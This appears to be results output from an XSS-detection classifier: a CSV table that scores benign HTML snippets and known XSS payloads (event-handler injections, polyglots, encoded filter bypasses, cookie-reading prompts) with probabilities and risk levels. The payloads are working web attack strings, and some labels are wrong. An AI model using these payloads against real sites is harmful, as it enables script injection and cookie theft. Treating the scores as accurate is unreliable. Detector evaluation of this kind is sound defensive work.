Входная строка;XSS;Вероятность;Риск
<h4>Login</h4>;False;27.98%;LOW
<input type='text' name='field'>;False;29.42%;LOW
<div>Home</div>;False;25.75%;LOW
<img[%09]onerror=alert(1) src=a>;True;99.52%;CRITICAL
<div>Home</div>;False;25.75%;LOW
"""><svg+onload=alert&amp;#x5D""1";True;99.49%;CRITICAL
"""><img src=x onerror=prompt('document.domain');>.aspx";True;80.54%;CRITICAL
"""><svg+onload=alert&amp;#x43""1";True;99.49%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<a href='/page'>Contact</a>;False;1.05%;SAFE
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"/</title/'/</style/</script/--><p"" onclick=alert()//>*/alert()/*";True;99.69%;CRITICAL
"""><svg+onload=alert&amp;#x70""1";True;99.49%;CRITICAL
"""><svg+onload=alert&amp;#x7B""1";True;99.49%;CRITICAL
"%27%3E%27%3E%22%3E%script%3Ealert(2);%3C/script%3E";True;90.55%;CRITICAL
<p>About</p>;False;34.33%;LOW
<input type='text' name='field'>;False;29.42%;LOW
<button>Read more</button>;False;28.28%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"""><A%20%252F=""""Href=%20JavaScript:k='%22',top[k+'lert']('XSS')"">";True;81.97%;CRITICAL
"<EMBED SRC=""data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="" type=""image/svg+xml"" AllowScriptAccess=""always""></EMBED>";True;73.65%;HIGH
<a href='/page'>Contact</a>;False;1.05%;SAFE
â€œ>-setTimeout`\u0028alert(1)\u0029`-â€™;True;86.30%;CRITICAL
with(document)alert(cookie);True;89.87%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
"<a href=""j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;"">X</a>";False;3.25%;SAFE
<h4>Login</h4>;False;27.98%;LOW
%22%3E%3Cimg%20src%3Dx%20onerror%3Dprompt%28document.cookie%29%3B%3E;True;80.35%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
"""><svg+onload=alert&amp;#x1D""1";True;99.49%;CRITICAL
<h2>Login</h2>;False;27.98%;LOW
"""onmouseover=alert(1)";True;99.20%;CRITICAL
<x onauxclick=import('//xss/')>click;True;66.66%;HIGH
<a href='/page'>Contact</a>;False;1.05%;SAFE
this['alert']();True;91.13%;CRITICAL
<span class='class-134'>Services</span>;False;1.13%;SAFE
<input type='text' name='field'>;False;29.42%;LOW
<div>Home</div>;False;25.75%;LOW
<span class='class-1134'>Services</span>;False;1.13%;SAFE
"javascript:alert()//--></script></textarea></style></title><a""//' onclick=alert()//>*/alert()/*";True;99.09%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<div>Home</div>;False;25.75%;LOW
"""><img src=x onerror=prompt('document.domain');>.php";True;80.54%;CRITICAL
top[â€œalâ€+â€ertâ€](1);True;83.92%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"\"";alert(1);//";True;93.43%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<body onfocusin=alert(1)>;True;99.68%;CRITICAL
<style>//*{x:expression(alert(/xss/))}//<style></style>;True;70.28%;HIGH
"x""><svg%0Donload=""window['alert'](document['cookie'])"">";True;93.58%;CRITICAL
